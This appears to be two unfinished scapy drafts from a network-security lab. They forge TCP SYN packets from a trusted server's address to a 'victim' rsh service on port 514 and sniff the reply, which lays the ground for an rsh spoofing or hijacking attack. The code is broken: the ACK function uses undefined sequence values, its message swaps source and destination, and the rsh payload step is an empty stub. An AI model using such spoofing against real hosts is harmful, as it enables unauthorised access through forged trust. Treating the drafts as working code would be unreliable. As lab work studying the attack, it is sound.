#!/usr/bin/python3

# Comments in quotation marks are from the scapy documentation

# ’U’: URG bit
# ’A’: ACK bit
# ’P’: PSH bit
# ’R’: RST bit
# ’S’: SYN bit
# ’F’: FIN bit

from scapy.all import *

x_ip = "10.0.2.8"
x_port = 514

srv_ip = "10.0.2.15"
srv_port = 1023

def send_SYN(sip, dip, sport, dport):
	ip = IP(src=sip, dst=dip)
	tcp = TCP(sport=sport, dport=dport)
	tcp.flags = "S"
	packet = ip/tcp

	if tcp.flags == "S":
		print("Sending SYN to {}:{} from {}:{}".format(sip, sport, dip, dport))
		# ls(packet) # "List available layers, or infos on a given layer class or name."
		send(packet)
	else:
		print("Error: TCP flag not set to SYN in send_SYN function. Quitting...")
		quit()

def send_ACK(sip, dip, sport, dport, seq, ack):
	ip = IP(src=sip, dst=dip)
	tcp = TCP(sport=sport, dport=dport)
	tcp.flags = "A"
	packet = ip/tcp

	if tcp.flags == "A":
		print("Sending ACK to {}:{} from {}:{} with ".format(sip, sport, dip, dport))
		# ls(packet) # "List available layers, or infos on a given layer class or name."
		send(packet)
	else:
		print("Error: TCP flag not set to ACK in send_ACK function. Quitting...")
		quit()

def send_RSH_data():
	print("Something")

send_SYN(srv_ip, x_ip, srv_port, x_port)
# sniff syn+ack response from victim
send_ACK(srv_ip, x_ip, srv_port, x_port, seq, ack)




###############################################





#!/usr/bin/python3
 
# Comments in quotation marks are from the scapy documentation
 
# ’U’: URG bit
# ’A’: ACK bit
# ’P’: PSH bit
# ’R’: RST bit
# ’S’: SYN bit
# ’F’: FIN bit
 
from scapy.all import *
import time

# victim oh no plz help me  
x_ip = "10.0.2.8"
x_port = 514
 
# server trusty ol server
srv_ip = "10.0.2.7"
srv_port = 1023
 
def send_SYN(sip, dip, sport, dport):
	ip = IP(src=sip, dst=dip)
	tcp = TCP(sport=sport, dport=dport)
	tcp.flags = "S"
	packet = ip/tcp
 
	if tcp.flags == "S":
		print("Sending SYN to {}:{} from {}:{}".format(sip, sport, dip, dport))
		# ls(packet) # "List available layers, or infos on a given layer class or name."
		send(packet)
	else:
		print("Error: TCP flag not set to SYN in send_SYN function. Quitting...")
		quit()






boi = AsyncSniffer(count=2)

boi.start()

send_SYN(srv_ip, x_ip, srv_port, x_port)

boi.join()

results = boi.results 

print(results)
time.sleep(20)

boi.stop()


